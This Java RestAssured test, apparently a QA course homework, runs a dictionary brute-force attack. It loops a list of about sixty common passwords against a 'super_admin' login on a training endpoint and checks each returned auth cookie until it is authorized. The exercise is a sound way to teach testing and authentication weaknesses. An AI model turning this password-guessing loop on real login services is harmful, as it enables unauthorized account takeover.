package LsTwo;

import constants.Constants;
import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

public class BruteforceTest {

    private static final List<String> TOP_PASSWORDS = List.of("123456", "password", "12345678", "qwerty",
            "abc123", "monkey", "1234567", "letmein", "dragon", "111111", "baseball", "iloveyou", "trustno1",
            "adobe123", "123123", "sunshine", "master", "welcome", "shadow", "ashley", "passw0rd", "654321", "jesus",
            "michael", "football", "princess", "login", "solo", "mustang", "ninja", "azerty", "batman", "zaq1zaq1",
            "123456789", "1234", "12345", "1234567890", "photoshop", "flower", "hottie", "freedom", "aa123456",
            "whatever", "donald", "1qaz2wsx", "starwars", "121212", "1q2w3e4r", "666666", "qwerty123", "555555",
            "lovely", "7777777", "888888", "qwertyuiop", "!@#$%^&*", "hello", "charlie", "superman", "696969");

    @Test
    public void testBruteforceByCookie() {

        Map<String, String> credentials = new HashMap<>();
        credentials.put("login", "super_admin");
        credentials.put("password", "");

        String cookieName = "auth_cookie";
        Map<String, String> cookie = new HashMap<>();
        cookie.put(cookieName, "");

        for (String password : TOP_PASSWORDS) {

            credentials.replace("password", password);

            cookieGetter(credentials, cookieName, cookie);

            if (Objects.equals(messageChecker(cookie), "You are authorized")) {
                System.out.println("Correct password is: " + password);
                System.out.println(messageChecker(cookie));
                break;
            }

        }

    }

    private void cookieGetter(Map<String, String> credentials,
                              String cookieName,
                              Map<String, String> cookie){
        Response getCookie = RestAssured
                .given()
                .body(credentials)
                .post(Constants.AJAX_URL + "/get_secret_password_homework")
                .andReturn();

        cookie.replace(cookieName, getCookie.getCookie(cookieName));

    }

    private String messageChecker(Map<String, String> cookie) {
        Response getMessage = RestAssured
                .given()
                .cookies(cookie)
                .when()
                .post(Constants.AJAX_URL + "/check_auth_cookie")
                .andReturn();
        return getMessage.asString();
    }

}
